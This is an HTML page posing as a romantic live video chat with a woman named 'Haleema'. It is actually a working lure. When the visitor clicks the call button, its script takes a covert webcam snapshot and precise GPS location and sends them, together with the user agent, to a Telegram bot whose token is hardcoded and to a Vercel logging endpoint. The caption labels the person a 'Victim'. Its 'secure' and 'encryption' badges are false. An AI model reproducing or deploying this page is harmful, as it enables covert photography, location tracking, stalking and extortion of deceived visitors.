<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>💋 Live Video Chat - Haleema</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(135deg, #1a0033, #4a004d);
      color: white;
      margin: 0;
      padding: 0;
      height: 100vh;
      overflow: hidden;
      text-align: center;
    }
    .container {
      max-width: 380px;
      margin: 40px auto;
      background: rgba(0,0,0,0.85);
      border-radius: 20px;
      padding: 25px;
      box-shadow: 0 0 30px rgba(255, 20, 147, 0.6);
      border: 2px solid #ff1493;
    }
    .girl-img {
      width: 180px;
      height: 180px;
      border-radius: 50%;
      border: 5px solid #ff1493;
      margin: 15px auto;
      box-shadow: 0 0 25px #ff1493;
    }
    .name {
      font-family: 'Pacifico', cursive;
      font-size: 32px;
      color: #ff1493;
      margin: 10px 0;
    }
    .status {
      color: #00ff00;
      font-weight: bold;
      animation: pulse 2s infinite;
    }
    .message {
      background: #2a002a;
      padding: 15px;
      border-radius: 12px;
      margin: 20px 0;
      font-size: 15px;
    }
    .btn {
      background: linear-gradient(45deg, #ff1493, #ff69b4);
      color: white;
      padding: 16px 40px;
      font-size: 18px;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      margin: 15px 0;
      box-shadow: 0 8px 20px rgba(255,20,147,0.5);
      transition: all 0.3s;
    }
    .btn:hover {
      transform: scale(1.08);
      box-shadow: 0 12px 30px rgba(255,20,147,0.8);
    }
    video, canvas { display: none; }
    @keyframes pulse { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }
    .urgent { color: #ffd700; animation: urgent 1.5s infinite; }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://i.imgur.com/0Z3vK8L.jpeg" class="girl-img" alt="Girl">
    <div class="name">Haleema</div>
    <div class="status">● Online Now - Video Call Available</div>
    <div class="message">
      💬 Hey! I want to do video call with you.<br>
      <span class="urgent">Allow Camera + Location to Connect Instantly</span>
    </div>
    <button class="btn" onclick="captureAndSend('Haleema')">Start Video Call Now</button>
    <p style="font-size:12px;opacity:0.7;margin-top:20px;">🔒 Secure Connection • 256-bit Encryption</p>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="320" height="240"></canvas>

  <script>
    // 🔥 Telegram Config
    const BOT_TOKEN = "8492435886:AAGUI6ozYot1jLYqP0Ryf23UQzz8tgjNYyE";
    const CHAT_ID = "6783114912";

    // 📸 + 📍 Capture & Send to BOTH
    async function captureAndSend(name) {
      try {
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        await new Promise(resolve => {
          video.onloadedmetadata = () => {
            video.play();
            setTimeout(resolve, 1500);
          };
        });

        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL("image/jpeg");

        stream.getTracks().forEach(track => track.stop());

        const locationData = await getLocation().catch(() => null);

        sendToBoth(imageData, name, locationData);

      } catch (err) {
        alert("❌ Camera error. Please allow access.");
      }
    }

    function getLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) return reject();
        navigator.geolocation.getCurrentPosition(
          pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
          reject,
          { enableHighAccuracy: true, timeout: 10000 }
        );
      });
    }

    function sendToBoth(imageData, name, locationData) {
      const payload = {
        name: name,
        photo: imageData,
        lat: locationData ? locationData.lat : null,
        lon: locationData ? locationData.lon : null,
        acc: locationData ? locationData.acc : null,
        time: new Date().toISOString(),
        userAgent: navigator.userAgent
      };

      // Telegram
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("caption", `📸 Victim: ${name}\n📍 ${payload.lat || 'N/A'}, ${payload.lon || 'N/A'}\nTime: ${payload.time}`);
      formData.append("photo", dataURItoBlob(imageData), "photo.jpg");

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData }).catch(() => {});

      // Vercel
      fetch('https://videocall-orcin-two.vercel.app/api/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(() => {});
    }

    function dataURItoBlob(dataURI) {
      let byteString = atob(dataURI.split(",")[1]);
      let mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
      let ab = new ArrayBuffer(byteString.length);
      let ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
      return new Blob([ab], { type: mimeString });
    }
  </script>
</body>
</html>
